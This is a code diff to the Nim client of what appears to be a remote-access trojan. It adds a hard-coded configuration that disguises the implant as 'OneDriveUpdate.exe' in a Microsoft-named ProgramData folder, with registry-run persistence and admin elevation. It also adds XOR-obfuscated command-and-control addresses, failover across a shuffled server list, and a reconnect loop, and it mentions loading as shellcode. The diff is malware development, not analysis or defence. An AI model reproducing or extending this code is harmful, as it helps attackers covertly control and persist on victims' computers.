@@ -78,9 +78,39 @@ type
     arg1*: uint32
     arg2*: uint32
 
+# Helper to assign string to char array
+proc toCharArray[N: static[int]](s: string): array[N, char] =
+  for i in 0 ..< min(s.len, N):
+    result[i] = s[i]
+
 # Global config (Will be patched or passed from Loader)
 # In a real shellcode scenario, this might be resolved dynamically or patched into the shellcode.
-var g_config* {.exportc, dynlib.}: CONNECT_ADDRESS
+var g_config* {.exportc, dynlib, used.} = CONNECT_ADDRESS(
+  szFlag: toCharArray[32]("FRMD26_CONFIG"),
+  szServerIP: toCharArray[100]("127.0.0.1"),
+  szPort: toCharArray[8]("8080"),
+  iType: 0,
+  bEncrypt: 0,
+  szBuildDate: toCharArray[12]("2026-02-10"),
+  iMultiOpen: 1,
+  iStartup: 1,
+  iHeaderEnc: 1,
+  protoType: 0.char,
+  runningType: 0.char,
+  payloadType: 0.char,
+  szGroupName: toCharArray[24]("default"),
+  runasAdmin: 1.char,
+  szInstallDir: toCharArray[260](r"C:\ProgramData\Microsoft\OneDriveUpdate"),
+  szInstallName: toCharArray[260]("OneDriveUpdate.exe"),
+  szDownloadUrl: toCharArray[512](""),
+  taskStartup: 0.char,
+  serviceStartup: 0.char,
+  registryStartup: 1.char,
+  iPumpSize: 0,
+  clientID: 0,
+  parentHwnd: 0,
+  superAdmin: 0
+)
 
 # Helper to convert char array to string
 proc toString(arr: openArray[char]): string =
@@ -88,18 +118,6 @@ proc toString(arr: openArray[char]): string =
   for c in arr:
     if c == '\0': break
     result.add(c)
-
-# Helper to assign string to char array (for default config)
-template assign(arr: var openArray[char], s: string) =
-  for i in 0 ..< min(arr.len - 1, s.len):
-    arr[i] = s[i]
-  arr[min(arr.len - 1, s.len)] = '\0'
-
-proc init_default_config() =
-  # Default fallback config
-  assign(g_config.szFlag, "FRMD26_CONFIG")
-  assign(g_config.szServerIP, "127.0.0.1")
-  assign(g_config.szPort, "8080")
 
 # --- Helper Functions ---
 
@@ -202,13 +220,32 @@ proc send_pkg(s: lean.SOCKET, cmd: uint32, data: pointer, len: int) =
   if len > 0:
     send(s, cast[ptr char](data), int32(len), 0)
 
+import std/random
+
 proc run_client_loop*() {.exportc, dynlib.} =
   var wsa: WSAData
   if WSAStartup(0x0202, addr wsa) != 0:
     return
 
-  let serverIP = toString(g_config.szServerIP)
+  var rawIP = toString(g_config.szServerIP)
+  
+  # Decrypt IP if needed
+  if g_config.bEncrypt == 1:
+    var decrypted = ""
+    for c in rawIP:
+      decrypted.add(char(byte(c) xor 0x5A))
+    rawIP = decrypted
+
   let serverPort = parseInt(toString(g_config.szPort))
+  var serverList = rawIP.split(";")
+
+  # If random mode (0), shuffle the list
+  if g_config.runningType == 0.char:
+    randomize()
+    shuffle(serverList)
+
+  # Parallel mode handling (same as loader)
+  var currentServerIdx = 0
 
   while true:
     if sock == INVALID_SOCKET:
@@ -220,12 +257,17 @@ proc run_client_loop*() {.exportc, dynlib.} =
       var addr_in: sockaddr_in
       addr_in.sin_family = AF_INET
       addr_in.sin_port = htons(uint16(serverPort))
-      addr_in.sin_addr.S_addr = inet_addr(serverIP)
+      
+      let currentIP = serverList[currentServerIdx]
+      addr_in.sin_addr.S_addr = inet_addr(currentIP)
 
       if connect(sock, cast[ptr sockaddr](addr addr_in), int32(sizeof(addr_in))) == SOCKET_ERROR:
         closesocket(sock)
         sock = INVALID_SOCKET
-        Sleep(5000)
+        
+        # Try next server
+        currentServerIdx = (currentServerIdx + 1) mod serverList.len
+        Sleep(2000)
         continue
       
       # Send Heartbeat as handshake
@@ -308,5 +350,5 @@ proc run_client_loop*() {.exportc, dynlib.} =
           discard
 
 when isMainModule:
-  init_default_config()
+  # init_default_config() - Removed, using static initialization
   run_client_loop()
